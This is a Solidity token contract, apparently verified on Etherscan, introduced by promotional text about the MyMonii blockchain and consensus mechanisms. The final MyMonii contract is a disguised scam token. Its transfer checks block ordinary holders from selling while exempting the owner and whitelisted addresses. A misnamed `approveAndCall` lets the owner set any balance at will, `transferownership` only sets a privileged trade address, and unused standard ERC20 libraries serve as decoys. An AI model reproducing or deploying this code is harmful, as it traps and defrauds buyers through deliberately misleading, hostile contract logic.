/**
 *Submitted for verification at Etherscan.io on 2021-12-17
*/

/*
MyMonii is a future-oriented virtual world blockchain infrastructure incubated by MixMarvel. It integrates cross-chain protocol, NFT protocol, and EVM protocol. As a high-performance chain group that can realize the multi-chain contract interoperability of the EVM system. MyMonii serves all entrepreneurs who want to explore the blockchain world, allowing pioneer developers to freely try diverse content and applications in the MyMonii ecosystem without permission.



MyMonii VRF+BLS Сonsensus Mechanism: Solving the Problem of High-Frequency Trading
In the previous MyMonii Virtual Machine Technology article series, we have introduced REVM optimised functions based on compatibility with EVM. In short, they are adding standard library and tool kits to reduce the difficulty of development and improve coding and operating efficiency.
When the development threshold is lowered, and many developers enter the MyMonii for ecological construction, high-frequency transactions will inevitably occur. This requires MyMonii to ensure the efficiency, fairness and security of data through a suitable mechanism to guarantee stable high-frequency transactions.
The means to ensure this is the consensus mechanism of MyMonii that this article will analyse in detail.
What Is Consensus Mechanism
In a nutshell, the consensus mechanism is a means that “allows event participants to reach the same opinion on the same event”. In the blockchain network, the decentralised database is called the “ledger”, and each node can have a complete ledger. The consensus mechanism can determine which node is responsible for writing new data in the ledger and maintaining the unification of the ledger. Therefore, the consensus mechanism allows distributed systems (computer networks) to work together and maintain security.
The Importance of Consensus Mechanism
Ledgers of the blockchain are kept by nodes, and the ledger contents of all nodes are precisely the same. Each node can add transactions to the ledger or find transactions based on its own local ledger. This mechanism has risks: when some nodes record a transfer, and some do not, the system cannot determine the authenticity of the transfer. At this time, the existence of a consensus mechanism is essential. The consensus mechanism allows organisations to complete large-scale cluster collaboration and ensure data security without relying on any centralised organisation.
Technology Selection of Consensus Mechanism
With the emergence of various public chains, the consensus mechanism has also been developed to deal with multiple security issues accordingly. Now, a variety of technology options have been available in the industry. The following analysis will focus on PoW, PoS, and DPOS.
PoW
PoW — Proof of Work — is a proof of workload mechanism. Workload refers to the computing power of the miners. Miners use their computing power to mine, and the miners’ computing power concentrated for mining is called pool mining. The essence of PoW mining is a process of competing for bookkeeping rights. Whether it’s separate miners or mining pools, all they are fighting for is computing power. The greater the computing power (workload), the faster the calculation of the hash value of the block and the more bookkeeping rights and income earned.
PoW can guarantee the security and fairness of the network. First of all, it has no other application scenarios other than mining, which ensures network security to a certain extent. Secondly, the attacker must invest more than 51% of the computing power in tampering with the result. That ratio is too much to support, which means PoW can counter DoS attacks. At the same time, since the miners obtain bookkeeping rights only related to the computing power, it also guarantees the fairness of the block production to a certain extent.
However, PoW’s computing power mechanism leads to the wasting of resources. Miners need to pass many repeated calculations to obtain the required hash value to prove the workload since the hash function is random. That will consume tons of power resources and computing equipment, which is not environmentally friendly. In addition, the calculation process of the PoW mechanism allows two miners to calculate the result simultaneously so that the soft fork will appear. Suppose miners continue to perform operations on different chains that have been forked. The chain with more robust computing power will become longer. In that case, miners’ mining time will also last longer while the other fork chain is lost.
PoS
PoS — Proof of Stake — refers to the proof of stake mechanism, where the difficulty of mining is proportional to the share of a node in the network — aka the number of cryptocurrencies. This PoS mechanism does not require mining, nor does it consume tons of energy. The miner’s income is related to the amount of cryptocurrency held by the individual and the holding time. The higher the percentage of staking equity and the longer the holding time, the greater the probability of successful mining. The emergence of PoS is to reduce the resource consumption of mining and solve the soft fork problem of PoW.
But PoS can result in Matthew effect and security issues. Since it determines the efficiency by the number of tokens held, the more people who own more tokens, the easier it is to gain more benefits. It will cause the “the stronger becomes stronger, weaker become weaker” phenomenon, meaning smaller users’ would lose their right to speak. Worse, they wouldn’t care about voting governance and ecological construction, contrary to the original intention of decentralisation. Moreover, under the PoS mechanism, if someone wants to counterfeit the tokens, it would be easy to implement by holding a large amount of cryptocurrency. There is no need to invest in any complicated calculations. Compared to PoW, PoS has a lower cost when counterfeiting, and the security of PoS cannot be guaranteed.
DPOS
DPOS — Delegated Proof of Stake — is an authorised equity proof mechanism proposed by EOS. It is a consensus algorithm based on voting. There are two roles in DOS-notary and witness. The notary can vote to elect the block producer, the “authorised” party, and the witness refers to the selected node and authorised to conduct block production and verify transactions. The advantage of this mechanism is that when a node with a large number of coins does not have enough expertise to meet the requirements of a high-performance node, the notary can take advantages to vote for high-performance nodes for block verification and transactions. This ensures the efficient operation and block generation of the chain, which is more efficient than POS. However, DPOS is currently unable to solve the dilemma caused by POS.
MyMonii’s Consensus Mechanism and Its Advantages
MyMonii’s Consensus Mechanism
Unlike mainstream consensus mechanisms, MyMonii uses a more efficient and safer VRF+BLS consensus mechanism.
VRF, aka the Verifiable Random Function, is an algorithm for generating random numbers. This third-generation consensus algorithm was born when the POW, PoS, and DPoS were unable to effectively solve security and efficiency issues. With the help of the latest algorithm, verifying the legitimacy of VRF has become fast, so it is an efficient consensus algorithm. In MyMonii, the VRF algorithm selects candidate block packagers and candidate block verification groups.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract MyMonii {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}